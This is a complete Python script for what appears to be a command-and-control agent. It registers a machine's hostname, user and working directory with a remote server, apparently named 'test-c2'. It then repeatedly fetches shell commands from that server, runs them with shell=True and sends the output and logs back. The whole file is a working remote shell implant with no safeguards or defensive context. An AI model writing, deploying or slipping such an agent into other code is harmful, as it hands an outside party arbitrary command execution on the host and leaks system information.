import os
import time
import argparse
import requests
import subprocess
import signal
import threading
import json
from datetime import datetime

SERVER = os.getenv("CONTROL_SERVER", "https://test-c2.onrender.com")
POLL_INTERVAL = 0.3
AGENT_ID = None
STOPPING = False
CURRENT_PROCESS = None
CURRENT_LOCK = threading.Lock()


def log_message(message, level="INFO"):
    """Log message to both console and potentially to server"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"[{timestamp}] [{level}] {message}"
    print(log_line)
    
    # Send log to server if possible
    try:
        requests.post(f"{SERVER}/agent_log", json={
            "agent_id": AGENT_ID,
            "message": message,
            "level": level,
            "timestamp": timestamp
        }, timeout=5)
    except Exception:
        pass  # Don't fail if can't send log


def graceful_exit(signum, frame):
    global STOPPING
    STOPPING = True
    log_message("Received termination signal, shutting down gracefully", "WARNING")
    kill_current()


signal.signal(signal.SIGINT, graceful_exit)
signal.signal(signal.SIGTERM, graceful_exit)


def kill_current():
    global CURRENT_PROCESS
    with CURRENT_LOCK:
        if CURRENT_PROCESS:
            try:
                log_message(f"Killing current process PID: {CURRENT_PROCESS.pid}", "WARNING")
                os.killpg(os.getpgid(CURRENT_PROCESS.pid), signal.SIGKILL)
            except Exception as e:
                try:
                    CURRENT_PROCESS.terminate()
                    log_message(f"Terminated process: {e}", "WARNING")
                except Exception as e2:
                    log_message(f"Failed to kill process: {e2}", "ERROR")
            CURRENT_PROCESS = None


def register(agent_id, info):
    try:
        log_message(f"Registering agent {agent_id} to server", "INFO")
        r = requests.post(f"{SERVER}/register", json={"agent_id": agent_id, "info": info}, timeout=10)
        result = r.json()
        log_message(f"Registration result: {result.get('msg', 'Unknown')}", "INFO")
        return result
    except Exception as e:
        log_message(f"Registration failed: {e}", "ERROR")
        return None


def get_task(agent_id):
    try:
        r = requests.get(f"{SERVER}/task", params={"agent": agent_id}, timeout=30)
        return r.json().get("cmd", None)
    except Exception as e:
        log_message(f"Failed to get task: {e}", "ERROR")
        return None


def post_result(agent_id, cmd, result):
    try:
        log_message(f"Posting result for command: {cmd[:50]}...", "INFO")
        requests.post(f"{SERVER}/task_result", json={
            "agent_id": agent_id, "cmd": cmd, "result": result
        }, timeout=10)
    except Exception as e:
        log_message(f"Failed to post result: {e}", "ERROR")


def run_cmd_background(cmd, agent_id):
    global CURRENT_PROCESS
    log_message(f"Executing command: {cmd}", "INFO")
    
    try:
        start_time = time.time()
        with CURRENT_LOCK:
            CURRENT_PROCESS = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                preexec_fn=os.setsid  # Linux: new process group
            )
        
        stdout, stderr = CURRENT_PROCESS.communicate()
        end_time = time.time()
        execution_time = round(end_time - start_time, 2)
        
        code = CURRENT_PROCESS.returncode
        out = (stdout or "") + (stderr or "")
        
        log_message(f"Command completed in {execution_time}s with exit code: {code}", 
                   "INFO" if code == 0 else "WARNING")
        
        result_summary = f"code={code}, time={execution_time}s\n{out[:15000]}"
        post_result(agent_id, cmd, result_summary)
        
    except Exception as e:
        log_message(f"Command execution error: {e}", "ERROR")
        post_result(agent_id, cmd, f"error: {e}")
    finally:
        with CURRENT_LOCK:
            CURRENT_PROCESS = None


def main():
    global AGENT_ID
    parser = argparse.ArgumentParser()
    parser.add_argument("--id", required=False)
    parser.add_argument("--info", default="")
    args = parser.parse_args()
    AGENT_ID = args.id or os.uname().nodename or "agent-unknown"
    info = {"note": args.info, "cwd": os.getcwd(), "user": os.getenv("USER")}

    log_message(f"Starting agent {AGENT_ID}", "INFO")
    log_message(f"Server: {SERVER}", "INFO")
    log_message(f"Working directory: {os.getcwd()}", "INFO")
    log_message(f"User: {os.getenv('USER')}", "INFO")

    register(AGENT_ID, info)

    while not STOPPING:
        cmd = get_task(AGENT_ID)
        if cmd:
            if cmd == "__TERMINATE__":
                log_message("Received termination command", "WARNING")
                post_result(AGENT_ID, cmd, "terminated_by_control")
                break
            elif cmd == "__STOP__":
                log_message("Received stop current task command", "WARNING")
                kill_current()
                post_result(AGENT_ID, cmd, "stopped_current_task")
                continue

            # Run command in separate thread to be able to kill it
            t = threading.Thread(target=run_cmd_background, args=(cmd, AGENT_ID))
            t.daemon = True
            t.start()

        time.sleep(POLL_INTERVAL)

    kill_current()
    log_message("Agent exiting", "INFO")


if __name__ == "__main__":
    main()